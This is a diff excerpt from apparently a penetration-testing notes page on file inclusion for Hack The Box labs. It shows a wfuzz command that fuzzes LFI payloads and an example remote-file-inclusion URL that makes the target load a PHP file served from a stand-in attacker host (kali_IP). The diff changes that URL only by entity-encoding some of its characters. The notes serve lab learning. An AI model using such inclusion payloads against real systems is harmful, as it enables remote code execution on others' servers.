@@ -79,6 +79,6 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common nu
 
 Example:
 
-http://htb.local/?page=http://\<kali_IP:8000>/maliciou_s\_file.php
+http://htb.local/?page=http://\<kal&#x69;_&#x49;P:8000>/malicio&#x75;_&#x73;\_file.php
 
 <figure><img src="../../.gitbook/assets/image (7) (7).png" alt=""><figcaption></figcaption></figure>
